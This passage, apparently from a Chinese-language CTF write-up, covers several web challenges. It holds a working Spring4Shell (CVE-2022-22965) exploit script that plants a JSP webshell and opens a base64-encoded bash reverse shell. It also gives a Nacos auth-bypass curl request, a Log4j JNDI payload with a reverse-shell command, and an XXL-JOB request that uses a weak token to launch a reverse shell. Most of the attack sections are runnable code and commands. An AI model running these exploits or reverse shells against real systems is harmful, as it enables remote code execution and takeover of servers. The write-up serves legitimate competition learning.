9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">预留1s的时间，考验你点提交给管理员按钮的手速。</p>
+<p class="my-4 leading-7">管理员访问链接后可以看到cookie，将获取cookie写入浏览器，重新留言即可看到flag。</p>
+<h2 id="web-18-极简的spring" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-18-极简的spring">#</a>web-18 极简的Spring</h2>
+<p class="my-4 leading-7">CVE-2022-22965：Spring Framework远程代码执行漏洞</p>
+<p class="my-4 leading-7">github上找了一个exploit稍微修改了一下，修改成反弹shell</p>
+<div class="language-python"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-python" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>import requests
+</span></span><span style="display:block;padding:0 1.25rem">import argparse
+</span><span style="display:block;padding:0 1.25rem">from urllib.parse import urljoin
+</span><span style="display:block;padding:0 1.25rem">import base64
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">def make_runtime_payload(cmd, host=None, port=None):
+</span><span style="display:block;padding:0 1.25rem">    if host and port:
+</span><span style="display:block;padding:0 1.25rem">        bash_payload = base64.b64encode(f&quot;bash -i &gt;&amp; /dev/tcp/{host}/{port} 0&gt;&amp;1&quot;.encode())
+</span><span style="display:block;padding:0 1.25rem">        # https://ares-x.com/tools/runtime-exec/
+</span><span style="display:block;padding:0 1.25rem">        payload = &quot;bash -c {echo,&quot; + bash_payload.decode(&quot;utf-8&quot;) + &quot;}|{base64,-d}|{bash,-i}&quot;
+</span><span style="display:block;padding:0 1.25rem">        payload = f&#x27;&quot;{payload}&quot;&#x27;
+</span><span style="display:block;padding:0 1.25rem">        return payload
+</span><span style="display:block;padding:0 1.25rem">    else:
+</span><span style="display:block;padding:0 1.25rem">        payload = f&#x27;&quot;{cmd}&quot;&#x27;
+</span><span style="display:block;padding:0 1.25rem">        return payload
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">def url_encode(text):
+</span><span style="display:block;padding:0 1.25rem">    return text.replace(&#x27;/&#x27;, &#x27;%2F&#x27;).replace(&#x27; &#x27;, &#x27;%20&#x27;).replace(&#x27;=&#x27;, &#x27;%3D&#x27;).replace(&#x27;&amp;&#x27;, &#x27;%26&#x27;).replace(&#x27;&quot;&#x27;,
+</span><span style="display:block;padding:0 1.25rem">                                                                                                        &quot;%22&quot;).replace(
+</span><span style="display:block;padding:0 1.25rem">        &quot;&#x27;&quot;, &quot;%27&quot;).replace(&#x27;&gt;&#x27;, &quot;%3E&quot;).replace(&#x27;&lt;&#x27;, &quot;%3C&quot;).replace(&#x27;#&#x27;, &quot;%23&quot;).replace(&#x27;?&#x27;, &quot;%3F&quot;).replace(&#x27;+&#x27;, &quot;%2B&quot;)
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">def exploit(url, command, shell_name, password=&#x27;1337&#x27;):
+</span><span style="display:block;padding:0 1.25rem">    print(f&quot;418 - Trying to exploit {url}&quot;)
+</span><span style="display:block;padding:0 1.25rem">    headers = {&quot;suffix&quot;: &quot;%&gt;//&quot;,
+</span><span style="display:block;padding:0 1.25rem">               &quot;c1&quot;: &quot;Runtime&quot;,
+</span><span style="display:block;padding:0 1.25rem">               &quot;c2&quot;: &quot;&lt;%&quot;,
+</span><span style="display:block;padding:0 1.25rem">               &quot;DNT&quot;: &quot;1&quot;,
+</span><span style="display:block;padding:0 1.25rem">               &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,
+</span><span style="display:block;padding:0 1.25rem">               &quot;Cookie&quot;: &quot;miduncookie&quot; # TODO cookie
+</span><span style="display:block;padding:0 1.25rem">               }
+</span><span style="display:block;padding:0 1.25rem">    # https://github.com/craig/SpringCore0day original exploit
+</span><span style="display:block;padding:0 1.25rem">    data = f&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{url_encode(password)}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20=%20%25%7Bc1%7Di.getRuntime().exec({url_encode(command)}).getInputStream();%20int%20a%20=%20-1;%20byte%5B%5D%20b%20=%20new%20byte%5B2048%5D;%20while((a=in.read(b))!=-1)%7B%20out.println(new%20String(b));%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix={shell_name}&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    go = requests.post(url, headers=headers, data=data, timeout=15, allow_redirects=False, verify=False)
+</span><span style="display:block;padding:0 1.25rem">    shellurl = urljoin(url, f&#x27;{shell_name}.jsp&#x27;)
+</span><span style="display:block;padding:0 1.25rem">    shellgo = requests.get(shellurl, timeout=40, allow_redirects=False, verify=False)
+</span><span style="display:block;padding:0 1.25rem">    if shellgo.status_code == 200:
+</span><span style="display:block;padding:0 1.25rem">        print(f&quot;{shellgo.status_code} - Successfuly exploited, access in: {shellurl}?pwd={url_encode(password)}&quot;)
+</span><span style="display:block;padding:0 1.25rem">    else:
+</span><span style="display:block;padding:0 1.25rem">        print(f&quot;{shellgo.status_code} - {shellurl} is&#x27;n work :(&quot;)
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">def main():
+</span><span style="display:block;padding:0 1.25rem">    # parser = argparse.ArgumentParser(description=&#x27;&#x27;)
+</span><span style="display:block;padding:0 1.25rem">    # parser.add_argument(&#x27;-f&#x27;, &#x27;--file&#x27;,help=&#x27;File with a list of URLs (reverse-shell dont works here)&#x27;, required=False)
+</span><span style="display:block;padding:0 1.25rem">    # parser.add_argument(&#x27;-u&#x27;, &#x27;--url&#x27;,help=&#x27;Just one target URL&#x27;, required=False)
+</span><span style="display:block;padding:0 1.25rem">    # parser.add_argument(&#x27;-c&#x27;, &#x27;--command&#x27;,help=&#x27;Command to execute&#x27;, required=False)
+</span><span style="display:block;padding:0 1.25rem">    # parser.add_argument(&#x27;--host&#x27;, help=&#x27;Host to connect if you want a reverse shell&#x27;, required=False)
+</span><span style="display:block;padding:0 1.25rem">    # parser.add_argument(&#x27;--port&#x27;, help=&#x27;Port to connect if you want a reverse shell&#x27;, required=False)
+</span><span style="display:block;padding:0 1.25rem">    # parser.add_argument(&#x27;--shell_name&#x27;, help=&#x27;Name of the shell&#x27;, required=False, default=&quot;b1g0uS&quot;)
+</span><span style="display:block;padding:0 1.25rem">    # parser.add_argument(&#x27;--password&#x27;, help=&#x27;Password for shell&#x27;, required=False, default=&#x27;1337&#x27;)
+</span><span style="display:block;padding:0 1.25rem">    # args = parser.parse_args()
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    file_arg = &quot;sumy123123123123123123123&quot;
+</span><span style="display:block;padding:0 1.25rem">    dir_arg = &quot;webapps/ROOT&quot;
+</span><span style="display:block;padding:0 1.25rem">    url_arg = &quot;https://spring-ctfd.dun.mi.com/&quot;
+</span><span style="display:block;padding:0 1.25rem">    command_arg = None
+</span><span style="display:block;padding:0 1.25rem">    shell_name_arg = &quot;sumy_123&quot;
+</span><span style="display:block;padding:0 1.25rem">    password_arg = &quot;1423&quot;
+</span><span style="display:block;padding:0 1.25rem">    host_arg = &#x27;10.167.90.69&#x27;
+</span><span style="display:block;padding:0 1.25rem">    port_arg = &#x27;3000&#x27;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    if url_arg:
+</span><span style="display:block;padding:0 1.25rem">        if command_arg:
+</span><span style="display:block;padding:0 1.25rem">            exploit(url_arg, make_runtime_payload(command_arg), shell_name_arg, password=password_arg)
+</span><span style="display:block;padding:0 1.25rem">        elif host_arg and port_arg:
+</span><span style="display:block;padding:0 1.25rem">            exploit(url_arg, make_runtime_payload(None, host_arg, port_arg), shell_name_arg, password=password_arg)
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">if __name__ == &#x27;__main__&#x27;:
+</span><span style="display:block;padding:0 1.25rem">    print(&quot;SPRING CORE RCE. :)&quot;)
+</span><span style="display:block;padding:0 1.25rem">    main()</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">不知道怎么搞得，把服务打挂了一次。。。好像有内存泄露。。。</p>
+<h2 id="web-19-为什么不能用默认配置呢" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-19-为什么不能用默认配置呢">#</a>web-19 为什么不能用默认配置呢</h2>
+<p class="my-4 leading-7">nacos权限绕过漏洞(CVE-2021-29441)</p>
+<p class="my-4 leading-7">在AuthFilter过滤器中存在如下条件语句：</p>
+<p class="my-4 leading-7">useragent请求头如果以Constants.NACOS_SERVER_HEADER开头，则直接放通，执行后续的业务处理，而Constants.NACOS_SERVER_HEADER定义的正是&quot;Nacos-Server&quot;。</p>
+<div class="language-shell"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-shell" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span class="token" style="color:var(--code-token-function)">curl</span><span> --location --request GET </span><span class="token" style="color:var(--code-token-string)">&#x27;https://nacos-ctfd.dun.mi.com/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;authority: nacos-ctfd.dun.mi.com&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;accept-language: zh-CN,zh;q=0.9,en;q=0.8&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;cache-control: max-age=0&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;TODO miduncookie&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;if-modified-since: Fri, 29 Apr 2022 02:20:32 GMT&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-ch-ua: &quot;Chromium&quot;;v=&quot;104&quot;, &quot;/Not)A;Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;104&quot;&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-ch-ua-mobile: ?0&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-ch-ua-platform: &quot;macOS&quot;&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-fetch-dest: document&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-fetch-mode: navigate&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-fetch-site: same-origin&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-fetch-user: ?1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;upgrade-insecure-requests: 1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;user-agent: Nacos-Server&#x27;</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">有了user-agent: Nacos-Server之后，可以调用接口获取当前用户、添加用户。添加用户后，登录系统可以从系统的配置中获取flag。</p>
+<h2 id="web-20-记日志能有什么问题呢" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-20-记日志能有什么问题呢">#</a>web-20 记日志能有什么问题呢</h2>
+<p class="my-4 leading-7">猜测题目应该是把输入的用户名密码记录到日志中。</p>
+<p class="my-4 leading-7">想到了去年沸沸扬扬的 Apache Log4j远程代码执行漏洞（CVE-2021-44228）</p>
+<p class="my-4 leading-7"><a target="_blank" rel="noopener noreferrer" href="https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce" class="link-_707cf  link_3b154 inline-link_3b154">https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce</a></p>
+<p class="my-4 leading-7">Exploit执行反弹shell命令</p>
+<div class="language-java"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-java" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>String[] cmds = new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.167.90.69/3000 0&gt;&amp;1&quot;};</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">找一台服务器按照github说明开启jndi服务，用户名密码有一处填写</p>
+<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>${jndi:ldap://xx.xx.xx.xx:1389/Exploit}</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">反弹成功后，翻找目录找到flag。</p>
+<h2 id="web-22-破解token认证" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-22-破解token认证">#</a>web-22 破解Token认证</h2>
+<p class="my-4 leading-7">提示说找找其它端口，发现开启了9999端口，结合端口和分布式调度关键词，查找获取信息，可能是XXL-JOB调度的executor。</p>
+<p class="my-4 leading-7">访问地址，果然是这样。executor开启了token认证，但是弱口令猜测123456成功。</p>
+<p class="my-4 leading-7">基于以上，构造数据发送给executor执行shell命令，反弹shell。</p>
+<div class="language-shell"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-shell" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span class="token" style="color:var(--code-token-function)">curl</span><span> --location --request POST </span><span class="token" style="color:var(--code-token-string)">&#x27;http://10.38.202.127:9999/run&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Content-Type: application/json&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;XXL-JOB-ACCESS-TOKEN: 123456&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--data-raw </span><span class="token" style="color:var(--code-token-string)">&#x27;{
+</span></span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  &quot;jobId&quot;: 1,
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  &quot;executorTimeout&quot;: 0,
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  &quot;logId&quot;: 1,
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  &quot;logDateTime&quot;: 1655774599001,
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  &quot;glueSource&quot;: &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.167.90.69/3000 0&gt;&amp;1&quot;,
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  &quot;glueUpdatetime&quot;: 1655774599000,
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  &quot;broadcastIndex&quot;: 0,
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  &quot;broadcastTotal&quot;: 0
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">}
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">&#x27;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">翻找目录获得flag。</p>
+<h2 id="web-23-简单小游戏" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-23-简单小游戏">#</a>web-23 简单小游戏</h2>
+<p class="my-4 leading-7">小游戏挺好玩</p>
+<p class="my-4 leading-7"><img alt="小游戏成功代码" src="/static/image/web-23-1.71fd5ece.png"/></p>
+<p class="my-4 leading-7">翻找源码，发现在通过13关后，会从/flag.php文件获取flag，但是直接访问提示关键信息在/dog.png文件中。</p>
+<p class="my-4 leading-7">这里卡了好久，一直以为要分析狗的IDAT数据，或者是什么图片隐写之类的内容。</p>
+<p class="my-4 leading-7">后来发现，key就赤裸裸的写在dog.png文件里。</p>
+<p class="my-4 leading-7"><img alt="十六进制查看器" src="/static/image/web-23-2.dc142e15.png"/></p>
+<p class="my-4 leading-7">访问 <a target="_blank" rel="noopener noreferrer" href="https://ezhack-ctfd.dun.mi.com/flag.php?key=627bb02a22" class="link-_707cf  link_3b154 inline-link_3b154">https://ezhack-ctfd.dun.mi.com/flag.php?key=627bb02a22</a> 获取flag。</p>
+<h2 id="web-25-路径引发的惨案" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-25-路径引发的惨案">#</a>web-25 路径引发的惨案</h2>
+<p class="my-4 leading-7">python代码审计</p>
+<div class="language-python"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-python" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span># -*- coding: utf-8 -*-
+</span></span><span style="display:block;padding:0 1.25rem">import socket
+</span><span style="display:block;padding:0 1.25rem">import threading
+</span><span style="display:block;padding:0 1.25rem">from datetime import datetime
+</span><span style="display:block;padding:0 1.25rem">import os
+</span><span style="display:block;padding:0 1.25rem">import mimetypes
+</span><span style="display:block;padding:0 1.25rem">import urllib.parse
+</span><span style="display:block;padding:0 1.25rem">import sys
+</span><span style="display:block;padding:0 1.25rem">import subprocess
+</span><span style="display:block;padding:0 1.25rem">import re
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">respTemplate = &quot;&quot;&quot;HTTP/1.1 {statusNum} {statusCode}
+</span><span style="display:block;padding:0 1.25rem">Date: {dateSent}
+</span><span style="display:block;padding:0 1.25rem">Server: {server}
+</span><span style="display:block;padding:0 1.25rem">Last-Modified: {modified}
+</span><span style="display:block;padding:0 1.25rem">Content-Length: {length}
+</span><span style="display:block;padding:0 1.25rem">Content-Type: {contentType}
+</span><span style="display:block;padding:0 1.25rem">Connection: {connectionType}
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">{body}
+</span><span style="display:block;padding:0 1.25rem">&quot;&quot;&quot;
+</span><span style="display:block;padding:0 1.25rem">DOC_ROOT = &quot;../&quot;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">CODES = {&quot;200&quot;: &quot;OK&quot;,
+</span><span style="display:block;padding:0 1.25rem">         &quot;304&quot;: &quot;NOT MODIFIED&quot;,
+</span><span style="display:block;padding:0 1.25rem">         &quot;400&quot;: &quot;BAD REQUEST&quot;, &quot;401&quot;: &quot;UNAUTHORIZED&quot;, &quot;403&quot;: &quot;FORBIDDEN&quot;, &quot;404&quot;: &quot;NOT FOUND&quot;,
+</span><span style="display:block;padding:0 1.25rem">         &quot;500&quot;: &quot;INTERNAL SERVER ERROR&quot;}
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">MIMES = {&quot;txt&quot;: &quot;text/plain&quot;, &quot;css&quot;: &quot;text/css&quot;, &quot;html&quot;: &quot;text/html&quot;, &quot;png&quot;: &quot;image/png&quot;, &quot;jpg&quot;: &quot;image/jpg&quot;,
+</span><span style="display:block;padding:0 1.25rem">         &quot;ttf&quot;: &quot;application/octet-stream&quot;, &quot;otf&quot;: &quot;application/octet-stream&quot;, &quot;woff&quot;: &quot;font/woff&quot;,
+</span><span style="display:block;padding:0 1.25rem">         &quot;woff2&quot;: &quot;font/woff2&quot;,
+</span><span style="display:block;padding:0 1.25rem">         &quot;js&quot;: &quot;application/javascript&quot;, &quot;gz&quot;: &quot;application/zip&quot;, &quot;py&quot;: &quot;text/plain&quot;, &quot;map&quot;: &quot;application/octet-stream&quot;}
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">class Response:
+</span><span style="display:block;padding:0 1.25rem">    def __init__(self, **kwargs):
+</span><span style="display:block;padding:0 1.25rem">        self.__dict__.update(kwargs)
+</span><span style="display:block;padding:0 1.25rem">        now = datetime.now()
+</span><span style="display:block;padding:0 1.25rem">        self.dateSent = self.modified = now.strftime(&quot;%a, %d %b %Y %H:%M:%S&quot;)
+</span><span style="display:block;padding:0 1.25rem">
